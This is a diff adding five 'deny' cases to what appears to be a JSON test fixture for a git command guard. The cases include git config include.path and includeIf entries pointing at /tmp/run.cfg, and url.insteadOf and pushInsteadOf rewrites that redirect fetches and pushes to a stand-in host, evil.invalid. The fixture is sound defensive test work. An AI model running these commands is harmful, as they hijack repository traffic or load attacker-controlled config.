@@ -10900,6 +10900,41 @@
     "command": "git config rename-section scratch alias"
    },
    "class": "deny"
+  },
+  {
+   "id": "guard-166",
+   "input": {
+    "command": "git -c include.path=/tmp/run.cfg ship"
+   },
+   "class": "deny"
+  },
+  {
+   "id": "guard-167",
+   "input": {
+    "command": "git -c url.https://evil.invalid/.insteadOf=https://good.invalid/ fetch"
+   },
+   "class": "deny"
+  },
+  {
+   "id": "guard-168",
+   "input": {
+    "command": "git config include.path /tmp/run.cfg"
+   },
+   "class": "deny"
+  },
+  {
+   "id": "guard-169",
+   "input": {
+    "command": "git config includeIf.gitdir:/x/.path /tmp/run.cfg"
+   },
+   "class": "deny"
+  },
+  {
+   "id": "guard-170",
+   "input": {
+    "command": "git config url.https://evil.invalid/.pushInsteadOf https://good.invalid/"
+   },
+   "class": "deny"
   }
  ]
 }
